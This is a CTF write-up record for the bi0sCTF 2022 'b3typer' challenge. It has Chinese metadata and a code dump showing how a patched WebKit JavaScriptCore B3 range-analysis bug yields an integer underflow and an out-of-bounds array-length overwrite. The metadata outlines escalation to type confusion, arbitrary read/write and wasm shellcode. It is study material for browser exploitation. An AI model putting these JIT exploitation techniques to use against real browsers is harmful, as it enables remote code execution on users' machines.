---
title: b3typer - bi0sCTF 2022
contest: bi0sCTF 2022
year: 2022
difficulty: hard
vuln_type:
- pwn_unknown
- reverse
tags:
- WebKit
- JSC
- JavaScriptCore
- B3
- JIT
- range-analysis
- integer-underflow
- OOB-write
- butterfly
- structID
attack_chain:
- 编译 debug 模式 WebKit JSC
- 分析 rangeForMask 偏差 [0,2] vs [1,2]
- 触发 c & 2 = 0 → 整数下溢到 -1
- 编译器假定 idx ≥ 0 跳过减法范围检查
- 覆盖 butterfly 后续数组 length=0x1337 OOB 读写
- 暴露 structureID bits → 类型混淆 + 任意 r/w
key_payload: let c = b & 2; let idx = c - 1; if (idx < 1) { idx += -0x80000000; }
one_liner: WebKit B3 rangeForMask 偏差 + 整数下溢消除边界检查
lesson: JIT range analysis 若起点假定偏移，实际 0 也可触发下溢消除上界检查；patch Reflect.strid 暴露 structureID 即可类型混淆
quality: high
full_path: b3typer_–_bi0sCTF_2022.full.md
meta_path: b3typer_–_bi0sCTF_2022.meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: b3typer - bi0sCTF 2022。WebKit B3 rangeForMask 偏差 + 整数下溢消除边界检查。关键路径：编译 debug 模式 WebKit JSC → 分析 rangeForMask 偏差 [0,2] vs [1,2] → 触发 c & 2 = 0 → 整数下溢到 -1。经验：JIT range analysis 若起点假定偏移，实际 0 也可触发下溢消除上界...
category: pwn
subcategory: pwn_other
subcategories:
- pwn_other
- reverse
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 0
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/92870.html
reasoning_chain:
- 触发点：tag 含 'WebKit' / 'JSC' / 'B3' / 'JIT' / 'range-analysis' / 'integer-underflow' → 假设：WebKit JavaScriptCore JIT 编译漏洞
- 动作：git clone + git checkout 645b9044 + debug.patch → 观察：apply patch 改 rangeForMask[0,2]→[1,2] → 下一步：build jsc debug
- 触发点：patch 让 mask 起点从 0 变 1 → 假设：c & 2 = 0 时 c - 1 = -1 → 假设：编译器假定 idx ≥ 0 跳过 CheckSub 范围检查
- 动作：写 JS let c = b & 2; let idx = c - 1; if (idx < 1) idx += -0x80000000 → 观察：触发 idx 整数下溢
- 假设：OOB 访问 butterfly 后续数组 → 动作：构造 length = 0x1337 触发越界读写
- 观察：越界后能改写 structureID bits → 触发点：patch Reflect.strid → 假设：暴露 strid 实现类型混淆
- 动作：构造 fake object + butterfly 重叠 → 观察：拿到任意 r/w → 下一步：构造 addrof/fakeobj 原语
- 假设：JSC addrof/fakeobj 可转 wasm/Code rwx shellcode → 动作：写 wasm page → shellcode → 弹计算器
failed_attempts:
- 试图用 RCE 在 stable 版触发 → 失败：debug.patch 必须 apply 才能复现下溢路径
- 试图不 patch 直接 fuzz rangeForMask → 失败：源码已修，必须按 patch 行为触发
- 试图用 TypedArray OOB 替代 butterfly OOB → 失败：patch 针对 butterfly 路径
key_observations:
- JIT range analysis 起点偏差 ([0,2] vs [1,2]) 会导致整数下溢消除上界检查，这是现代 JIT 漏洞的常见源头
- WebKit B3 IR 中 butterfly 是数组 length+data 紧凑结构，OOB 后能改 structureID 触发类型混淆
- patch Reflect.strid 暴露 strid 是从类型混淆到任意 r/w 的关键步骤
- WebKit JSC debug 模式编译是验证 JIT 漏洞的必要环境（release 编译会优化掉触发路径）
prerequisites:
- WebKit JSC 编译流程（build-webkit --jsc-only --debug）
- JIT range analysis / CheckSub / CheckBounds 原理
- JavaScriptCore 内存模型（butterfly / structureID）
- wasm rwx page + shellcode 编码
---
# b3typer – bi0sCTF 2022

> 原文: https://www.ctfiot.com/92870.html
> ID: 92870


```
1
2
3
4
5
6
7
8
9
git clone https://github.com/WebKit/WebKit.git
cd WebKit
git checkout 645b9044d2369e3b083b171da517a2440bb4fa18
git apply debug.patch
Tools/gtk/install-dependencies
Tools/Scripts/build-webkit --jsc-only --debug
cd WebKitBuild/Debug/bin

./jsc --useConcurrentJIT=false
1
2
3
4
5
6
7
8
9
10
template<typename T>
 static IntRange rangeForMask(T mask)
 {
 if (!(mask + 1))
 return top<T>();
 if (mask < 0)
 return IntRange(INT_MIN & mask, mask & INT_MAX);
- return IntRange(0, mask);
+ return IntRange(1, mask);
 }
1
2
3
4
5
6
7
8
9
IntRange rangeFor(Value* value, unsigned timeToLive = 5)
{
 // .....
 case BitAnd:
 if (value->child(1)->hasInt())
 return IntRange::
rangeForMask(value->child(1)->asInt(), value->type());
 break;
 // ......
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
void reduceValueStrength()
{
 // ...
 case CheckAdd: {
 // ...
 IntRange leftRange = rangeFor(m_value->child(0));
 IntRange rightRange = rangeFor(m_value->child(1));
 if (!leftRange.couldOverflowAdd(rightRange, m_value->type())) {
 replaceWithNewValue(
 m_proc.add<Value>(Add, m_value->origin(), m_value->child(0), m_value->child(1)));
 break;
 }
 break;
 }
 // ...
}
1
2
3
4
5
6
7
8
template<typename T>
bool couldOverflowAdd(const IntRange& other)
{
 return sumOverflows<T>(m_min, other.m_min)
 || sumOverflows<T>(m_min, other.m_max)
 || sumOverflows<T>(m_max, other.m_min)
 || sumOverflows<T>(m_max, other.m_max);
}
1
2
3
4
5
void lower() {
 // ...
 case CheckAdd:
 opcode = opcodeForType(BranchAdd32, BranchAdd64, m_value->type());
 // ...
1
2
3
4
5
6
function hax(a) {
 let b = a | 0;
 let c = b & 2;
 let d = c + -1;
 return d;
}
1
2
3
4
let b = a | 0;
let c = b & 2;
let d = c + -1;
let e = d + -0x80000000;
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
function hax(a) {
 let b = a | 0;
 let c = b & 2;
 let d = c + -1;
 let e = d + -0x80000000;
 return e;
}
function main() {
 for(let i = 0; i < 100000; ++i) {
 hax(2);
 }
}
noInline(hax);
noDFG(main);
noFTL(main);
main();
1
2
3
4
5
6
7
8
9
B3 after reduceDoubleToFloat, before reduceStrength:
...
b3 Int32 b@35 = CheckAdd(b@33:
WarmAny, $-1(b@34):
WarmAny, b@33:
ColdAny, generator = 0x7f551e032750, earlyClobbered = [], lateClobbered = [], usedRegisters = [], ExitsSideways|Reads:
Top, D@41)
b3 Int32 b@37 = CheckAdd(b@35:
WarmAny, $-2147483648(b@36):
WarmAny, b@35:
ColdAny, generator = 0x7f551e0327a0, earlyClobbered = [], lateClobbered = [], usedRegisters = [], ExitsSideways|Reads:
Top, D@45)
...
B3 after reduceStrength, before eliminateCommonSubexpressions:
...
b3 Int32 b@23 = Add(b@33, $2147483647(b@37), D@45)
...
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
function hax(arr, a) {
 // Force 32-bit integer
 let b = a | 0;
 // Setup bug trigger
 // compiler assumes range is [1, 2], actually [0, 2]
 let c = b & 2;
 // Trigger rangeFor
 // assumed range [0, 1], actual [-1, 1]
 let idx = c - 1;

 // Check will always pass
 if (idx < arr.length) {
 // Trigger integer underflow, idx will become INT_MAX
 // Compiler assumes this case only triggers for value 0, no underflow check
 if (idx < 1) {
 idx += -0x80000000;
 }
 // idx assumed to be < arr.length, only subtraction occurs
 if (idx > 0) {
 arr[idx] = 0x1337;
 }
 }
}
1
2
3
4
5
6
7
8
// idx is -1 here, passes the check
if (idx < 1) {
 idx += -0x80000000;
}
// idx is 0x7fffffff here, passes the check
if (idx > 2) {
 idx += -0x7fffffff;
}
1
2
3
4
5
6
JSCell Header
Butterfly pointer
Inline property 1
Inline property 2
...
...
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
@@ -285,4 +287,16 @@ JSC_DEFINE_HOST_FUNCTION(reflectObjectSetPrototypeOf, (JSGlobalObject* globalObj
 return JSValue::
encode(jsBoolean(didSetPrototype));
 }

+JSC_DEFINE_HOST_FUNCTION(reflectObjectStrid, (JSGlobalObject* globalObject, CallFrame* callFrame))
+{
+ VM& vm = globalObject->vm();
+ auto scope = DECLARE_THROW_SCOPE(vm);
+
+ JSValue target = callFrame->argument(0);
+ if (!target.isObject())
+ return JSValue::
encode(throwTypeError(globalObject, scope, "Reflect.strid requires the first argument be an object"_s));
+ JSObject* targetObject = asObject(target);
+ RELEASE_AND_RETURN(scope, JSValue::
encode(jsNumber(targetObject->structureID().bits())));
+}
+
1
fake butterfly -> target butterfly -> ?
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
function hax(arr, a) {
 // Force 32-bit integer
 let b = a | 0;
 // Setup bug trigger
 // compiler assumes range is [1, 2], actually [0, 2]
 let c = b & 2;
 // Trigger rangeFor
 // assumed range [0, 1], actual [-1, 1]
 let idx = c - 1;

 // Check will always pass
 if (idx < arr.length) {
 // Trigger integer underflow, idx will become INT_MAX
 // Compiler assumes this case only triggers for value 0, no underflow check
 if (idx < 1) {
 idx += -0x80000000;
 }
 // Use this to set oob write index
 if (idx > 2) {
 idx += -0x7ffffffa;
 }
 // idx assumed to be < arr.length, only subtraction occurs so upper bound is unchecked
 // Overwrite length of array to 0x1337
 if (idx > 0) {
 arr[idx] = 0x1337;
 }
 }
}

noInline(hax);

var arr = new Array(5);
var dblarr = new Array(5);
var objarr = new Array(5);
arr.fill(1);
dblarr.fill(13.37);
objarr.fill({});

function trigger() {
 for (var i = 0; i < 100000; ++i) {
 hax(arr, 2);
 }
 hax(arr, 1);

}
```
